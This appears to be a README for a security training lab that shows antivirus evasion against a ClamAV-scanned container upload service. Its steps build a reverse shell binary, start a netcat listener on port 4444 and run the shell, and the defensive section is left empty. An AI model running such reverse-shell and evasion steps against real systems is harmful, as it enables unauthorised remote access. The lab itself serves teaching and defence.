# Demo 01: Antivirus Evasion and Local File Inclusion Attacks

## Running an Application with a File Upload Function
**Step 1.** Change directories to the `app` folder. 
```bash
cd app/
```

**Step 2.** Build the container image. 
```bash
docker build --tag security/demo-01:latest -f docker/Dockerfile .
```

**Step 3.** Run the container.
```bash
docker run --name demo -p 8000:8000 security/demo-01:latest
```

## Deploying ClamAV as a Container
```bash
docker-compose -f clamav/server.yaml up
```

## Attack a Container Using Known Malware
```bash
python clamav/client.py clamav/EICAR
```

## Attack a Container Using Unknown Malware
```bash
python clamav/client.py -f attacker/reverse_shell.go
```

```bash
go build reverse_shell.go
python clamav/client.py -f clamav/reverse_shell
```

```bash
nc -nvlp 4444
./reverse_shell
```

## Protecting a Container From Unknown Malware

